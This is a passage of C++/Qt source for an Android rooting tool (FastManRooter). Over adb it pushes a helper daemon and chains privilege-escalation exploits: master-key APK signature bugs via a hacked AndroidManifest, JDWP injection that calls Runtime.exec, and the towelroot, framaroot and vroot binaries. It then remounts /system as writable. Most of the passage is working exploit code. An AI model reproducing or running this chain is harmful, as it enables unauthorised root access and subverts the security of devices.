            DBG("unsupported abi!\n");
            return false;
        }
        msg.data.putInt(su_size);
        msg.data.append((const char *)su_data, su_size);
    }
    if (!_socket->sendAndRecvMsg(msg)) {
        return false;
    }

    int i = 0;
    int ret = msg.data.getNextInt(i);
    QString resp = msg.data.getNextUtf8(i);
    DBG("code:%d, msg:'%s'\n", ret, resp.toLocal8Bit().data());
    return ret == 0;
}

FastManRooter::FastManRooter(const QString &adb_serial, int zm_port, int jdwp_port) {
    _socket = new FastManSocket(adb_serial, zm_port);
    this->adb_serial = adb_serial;
    this->zm_port = zm_port;
    this->jdwp_port = jdwp_port;
}

FastManRooter::~FastManRooter() {
    delete _socket;
}

bool FastManRooter::startZMaster(const QString& adb_serial) {
    AdbClient adb(adb_serial);
    adb.init_tmpdir();
    adb.adb_cmd("shell:mkdir "ZM_BASE_DIR);

    int sdkInt = -1;
    unsigned char *target_bin = bin_zmaster2;
    int target_size = sizeof(bin_zmaster2);
    QByteArray out = adb.adb_cmd("shell:getprop ro.build.version.sdk; getprop ro.product.cpu.abi");
    QList<QByteArray> lines = out.split('\n');
    for(int i=0; i<lines.count(); i++) {
        QByteArray line = lines[i];
        while(line.endsWith('\r') || line.endsWith('\n')) {
            line.chop(1);
        }

        if(i == 0) {
            sdkInt = line.toInt();
        } else if(i == 1) {
            if(line=="x86") {
                DBG("using x86 zmaster\n");
                target_bin = bin_zmaster2_x86;
                target_size = sizeof(bin_zmaster2_x86);
            } else if(line=="mips") {
                DBG("using mips zmaster\n");
                target_bin = bin_zmaster2_mips;
                target_size = sizeof(bin_zmaster2_mips);
            } else if(sdkInt >= 20){
                DBG("using arm.pie zmaster\n");
                target_bin = bin_zmaster2_pie;
                target_size = sizeof(bin_zmaster2_pie);
            }
        }
    }

#ifdef USE_BINARIES_H
    if(!adb.adb_pushData(target_bin, target_size, ZM_BASE_DIR"/zmaster", 0777)) {
#else
    if(!adb.adb_push("zmaster2", ZM_BASE_DIR"/zmaster", 0777)) {
#endif
        DBG("push zmaster2 fail!\n");
        return false;
    }

    adb.adb_cmd("shell:"ZM_BASE_DIR"/zmaster -D -from-shell; sleep 1", 2000);
    adb.adb_cmd("shell:echo '"ZM_BASE_DIR"/zmaster -D -from-su; sleep 1; exit' | su", 2000);
    return true;
}

static QByteArray readFileToBytes(const QString& filename) {
    QByteArray ret;
    QFile f(filename);
    if(f.open(QIODevice::ReadOnly)) {
        ret.append(f.readAll());
    }
    return ret;
}

static int readFileSize(const QString& filename) {
    QFileInfo f(filename);
    return f.size();
}

QMutex apkMutex;
bool tryBug9950697(AdbClient& adb, const QString& path, const QString md5) {
    QString src = md5+"_o";
    QString dest = md5+"_3";
    bool r = true;
    apkMutex.lock();
    if(!QFile::exists(dest)) {
        ZipHacker h;
        r = false;
        do {
            if(!QFile::exists(src) && !adb.adb_pull(path, src)) {
                DBG("fail!\n");
                break;
            }

            if(!h.readZipFile(src)) {
                DBG("fail!\n");
                break;
            }

            ZipHackerEntry *hEntry = new ZipHackerEntry();
            hEntry->name = "AndroidManifest.xml";
#ifdef USE_BINARIES_H
            hEntry->data.append((char *) bin_hacked_AndroidManifest_xml, sizeof(bin_hacked_AndroidManifest_xml));
#else
            hEntry->data.append(readFileToBytes("hacked_AndroidManifest.xml"));
#endif
            hEntry->compress_level = 0;
            h.hackedEntries.append(hEntry);

            if (!h.writeZipFile(dest, ZipHacker::MODE_9950697)) {
                DBG("fail!\n");
                break;
            }
            r = true;
        } while(0);
    }
    apkMutex.unlock();
    if(!r) {
        return false;
    }
    return adb.adb_install(dest);
}

bool tryBug8219321(AdbClient& adb, const QString& path, const QString md5) {
    QString src = md5+"_o";
    QString dest = md5+"_1";
    bool r = true;
    apkMutex.lock();
    if(!QFile::exists(dest)) {
        ZipHacker h;
        r = false;
        do {
            if(!QFile::exists(src) && !adb.adb_pull(path, src)) {
                DBG("fail!\n");
                break;
            }

            if(!h.readZipFile(src)) {
                DBG("fail!\n");
                break;
            }

            ZipHackerEntry *hEntry = new ZipHackerEntry();
            hEntry->name = "AndroidManifest.xml";
#ifdef USE_BINARIES_H
            hEntry->data.append((char *) bin_hacked_AndroidManifest_xml, sizeof(bin_hacked_AndroidManifest_xml));
#else
            hEntry->data.append(readFileToBytes("hacked_AndroidManifest.xml"));
#endif
            hEntry->compress_level = Z_DEFAULT_COMPRESSION;
            h.entries.insert(0, hEntry);

            if (!h.writeZipFile(dest, ZipHacker::MODE_DEFAULT)) {
                DBG("fail!\n");
                break;
            }
            r = true;
        } while(0);
    }
    apkMutex.unlock();
    if(!r) {
        return false;
    }
    return adb.adb_install(dest);
}

bool tryBug9695860(AdbClient& adb, const QString& path, const QString md5) {
    QString src = md5+"_d";
    QString dest = md5+"_2";
    bool r = true;
    apkMutex.lock();
    if(!QFile::exists(dest)) {
        ZipHacker h;
        ZipHacker h1;
        r = false;
        do {
            if(!QFile::exists(src) && !adb.adb_pull(path, src)) {
                DBG("fail!\n");
                break;
            }

            if(!h.readZipFile(src)) {
                DBG("fail!\n");
                break;
            }

            if (!QFile::exists("blank.apk")) {
#ifdef USE_BINARIES_H
                QFile f("blank.apk");
                if (f.open(QIODevice::WriteOnly)) {
                    f.write((const char *) bin_blank_apk, sizeof(bin_blank_apk));
                    f.close();
                }
#else
                DBG("fail!\n");
                break;
#endif
            }

            if(!h1.readZipFile("blank.apk")) {
                DBG("fail!\n");
                break;
            }

            h.hackedEntries.append(h1.entries);
            h1.entries.clear(); // avoid auto delete

            if (!h.writeZipFile(dest, ZipHacker::MODE_9695860)) {
                DBG("fail!\n");
                break;
            }
            r = true;
        } while(0);
    }
    apkMutex.unlock();
    if(!r) {
        return false;
    }
    return adb.adb_install(dest);
}

//#define TRY_ADB_ROOT // not working for most devices, leads to bugs

bool FastManRooter::getTowelRoot(QString &err_msg) {
    AdbClient adb(adb_serial);
    FastManClient cli(adb_serial, zm_port);
    do {
#ifdef USE_BINARIES_H
        if(!adb.adb_pushData(bin_tr, sizeof(bin_tr), ZM_BASE_DIR"/tr", 0777)) {
#else
        if(!adb.adb_push("tr", ZM_BASE_DIR"/tr", 0777)) {
#endif
            DBG("push tr failed!\n");
            break;
        }

        adb.adb_cmd("shell:"ZM_BASE_DIR"/tr", 5000);
        for(int k=0; k<10; k++) {
            if(cli.switchRootCli()) {
                err_msg = QObject::tr("towelroot success");
                return true;
            }
            xsleep(500);
        }
    } while(0);
    err_msg = QObject::tr("towel root failed");
    return false;
}

bool FastManRooter::getRoot(QString &err_msg, int flag) {
    AdbClient adb(adb_serial);
    FastManClient cli(adb_serial, zm_port);
    bool ret = false;

#ifdef TRY_ADB_ROOT
    DBG("try adb root\n");
    QByteArray out = adb.adb_cmd("shell:id");
    if(!out.contains("uid=0(root)")) {
        out = adb.adb_cmd("root:");
        if(!out.contains("adbd cannot run as root")) {
            xsleep(3000);
            adb.adb_forward(QString("tcp:%1").arg(zm_port), QString("tcp:%1").arg(ZM_REMOTE_PORT));
        }
    }
#endif

    DBG("test and start zmaster\n");
    if(!cli.testValid()) {
        if(!startZMaster(adb_serial)) {
            err_msg = QObject::tr("cannot start zmaster");
            return false;
        }
    }

    DBG("zmaster might already be root\n");
    if(cli.switchRootCli()) {
        err_msg = QObject::tr("already has root");
        return true;
    }

    adb.pm_cmd("set-install-location 0 > /dev/null 2>&1");
    adb.pm_cmd("setInstallLocation 0 > /dev/null 2>&1");

    if((flag & FLAG_MASTERKEY_ROOT) != 0) {
        DBG("try master-key root\n");
        // impactor root - install
        do {
            APK_SAMPLE_INFO samples;
#ifdef USE_BINARIES_H
            if(!cli.getApkSample(samples, sizeof(bin_hacked_AndroidManifest_xml))) {
#else
            if(!cli.getApkSample(samples, readFileSize("hacked_AndroidManifest.xml"))) {
#endif
                err_msg = QObject::tr("cannot get apk samples");
                break;
            }

            if(!samples.path1.endsWith(".apk")) {
                err_msg = QObject::tr("no valid apk samples");
                break;
            }

            DBG("tryBug9950697\n");
            ret = tryBug9950697(adb, samples.path1, samples.md5_1);
            if(ret) {
                DBG("tryBug9950697 install success\n");
                break;
            }

            DBG("tryBug8219321\n");
            ret = tryBug8219321(adb, samples.path1, samples.md5_1);
            if(ret) {
                DBG("tryBug8219321 install success\n");
                break;
            }

            if(samples.path2.endsWith(".apk")) {
                DBG("tryBug9695860\n");
                ret = tryBug9695860(adb, samples.path2, samples.md5_2);
                if(ret) {
                    DBG("tryBug9695860 install success\n");
                    break;
                }
            }

            err_msg = QObject::tr("master-key bug not available");
        } while(0);

        // impactor root - invoke
        if(ret) {
            ret = false;
            JdwpWalker jdwp;
            VMInfo vmInfo;
            // 0x10000000 = Intent.FLAG_ACTIVITY_NEW_TASK
            // 0x4000000 = Intent.FLAG_ACTIVITY_CLEAR_TOP
            QString impact_cmd = QString("shell:am start -n %1/android.app.Activity -f 0x14000000").arg(impact_package);
            adb.adb_cmd(impact_cmd);
            xsleep(2000);

            do {
                if (!jdwp.vm_attach(vmInfo, impact_package, adb_serial, jdwp_port)) {
                    err_msg = QObject::tr("cannot attach jdwp");
                    break;
                }

                u64 tid = jdwp.getThreadID("<1> main");
                u64 cls_msgq = jdwp.getClassID("Landroid/os/MessageQueue;");
                u32 method_msgq_next = jdwp.getMethodID(cls_msgq, "next", "()Landroid/os/Message;");

                u64 cls_runtime = jdwp.getClassID("Ljava/lang/Runtime;");
                u32 method_runtime_getruntime = jdwp.getMethodID(cls_runtime, "getRuntime", "()Ljava/lang/Runtime;");
                u32 method_runtime_exec = jdwp.getMethodID(cls_runtime, "exec", "(Ljava/lang/String;)Ljava/lang/Process;");

                jdwp.vm_suspend();
                u32 bpoint = jdwp.setBreakPoint(tid, cls_msgq, method_msgq_next);

                jdwp.vm_resume();
                adb.adb_cmd(impact_cmd, 2000);
                if (bpoint == jdwp.getBreakPointEvent()) {
                    JdwpValue val;
                    QList<JdwpValue *> args;
                    u64 obj_runtime = jdwp.invokeStaticMethod(tid, cls_runtime, method_runtime_getruntime, args);
                    u64 obj_str = jdwp.newStringObject(ZM_BASE_DIR"/zmaster -J -from-jdwp");

                    args.append(&val);
                    val.tag = 116; // string
                    val.objID = obj_str;
                    jdwp.invokeObjectMethod(tid, cls_runtime, method_runtime_exec, obj_runtime, args);
                    jdwp.vm_resume();
                    ret = true;
                } else {
                    err_msg = QObject::tr("cannot get breakpoint event");
                }
                jdwp.vm_dettach();
            } while(0);
            adb.pm_cmd("uninstall "impact_package);
        }
        if(ret) {
            for(int k=0; k<10; k++) {
                if(cli.switchRootCli()) {
                    err_msg = QObject::tr("master-key root success");
                    return true;
                }
                xsleep(500);
            }
            err_msg = QObject::tr("master-key jdwp failed");
        }
    }

    if((flag & FLAG_FRAMA_ROOT) != 0) {
        // frama root
        DBG("try frama root\n");
#ifdef USE_BINARIES_H
        if (!QFile::exists("frama.apk")) {
            QFile f("frama.apk");
            if (f.open(QIODevice::WriteOnly)) {
                f.write((const char *) bin_frama_apk, sizeof(bin_frama_apk));
                f.close();
            }
        }
#endif
        if(adb.adb_install("frama.apk")) {
            adb.adb_cmd("shell: am start -n com.alephzain.framaroot/com.alephzain.framaroot.FramaActivity -f 0x14000000");
            xsleep(1500);
            adb.pm_cmd("uninstall com.alephzain.framaroot");
            if(cli.switchRootCli()) {
                err_msg = QObject::tr("frama root success");
                return true;
            }
        }
        err_msg = QObject::tr("frama root failed");
    }

    if((flag & FLAG_VROOT) != 0) {
        // vroot
        do {
#ifdef USE_BINARIES_H
            if(!adb.adb_pushData(bin_vr, sizeof(bin_vr), ZM_BASE_DIR"/vr", 0777)) {
#else
            if(!adb.adb_push("vr", ZM_BASE_DIR"/vr", 0777)) {
#endif
                DBG("push vr failed!\n");
                break;
            }

            adb.adb_cmd("shell:"ZM_BASE_DIR"/vr", 15000);
            for(int k=0; k<10; k++) {
                if(cli.switchRootCli()) {
                    err_msg = QObject::tr("vroot root success");
                    return true;
                }
                xsleep(500);
            }
        } while(0);
        err_msg = QObject::tr("vroot bug not available");
    }
    return false;
}

bool FastManRooter::checkSystemWriteable() {
    FastManClient cli(adb_serial, zm_port);
    QByteArray out;

    QByteArray d("hello world");
    QString rpath = "/system/." + QUuid::createUuid().toString();

    if(!cli.switchRootCli()) {
        return false;
    }
    cli.exec(out, 5, "/system/bin/mount", "-o", "remount", "null", "/system");

    if(!cli.pushData(d, rpath)) {
        return false;
    }

    cli.remove(rpath);
    return true;
}
